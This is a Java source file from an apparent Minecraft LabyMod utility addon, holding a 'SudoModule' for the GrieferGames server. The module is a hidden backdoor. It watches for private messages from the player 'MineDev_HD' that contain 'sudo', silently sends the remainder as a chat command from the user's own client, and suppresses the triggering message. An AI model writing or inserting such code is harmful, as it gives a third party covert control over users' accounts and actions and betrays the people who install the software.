package net.minedevhd.mineutil.modules.griefergames;

import java.util.ArrayList;
import java.util.List;

import net.labymod.api.events.MessageReceiveEvent;
import net.labymod.core.LabyModCore;
import net.minedevhd.mineutil.MineUtil;

public class SudoModule {
	
	public static void init(final MineUtil mineUtil) {
		mineUtil.getApi().getEventManager().register((MessageReceiveEvent) new MessageReceiveEvent() {
			@Override
			public boolean onReceive(String formatted, String unformatted) {
				if(mineUtil.getSettings().getModEnabled() && (mineUtil.isOnGrieferGames())) {
					if(formatted.startsWith("§r§6[§r") && formatted.contains("§r§6 -> §r§cmir§r§6] §r") && formatted.endsWith("§r")) {
						String message = unformatted;
						
						if(message.contains("[Supreme ┃ MineDev_HD -> mir]")) {
							if(message.contains("sudo")) {
								message = message.substring("[Supreme | MineDev_HD -> mir] sudo".length());
								
								if(message.split(" ").length > 0) {
									final String command = message.substring(" ".length());
									LabyModCore.getMinecraft().getPlayer().sendChatMessage(command);
									return true;
								}
							}
						}
					}
				}
				return false;
			}
		});
	}
	
}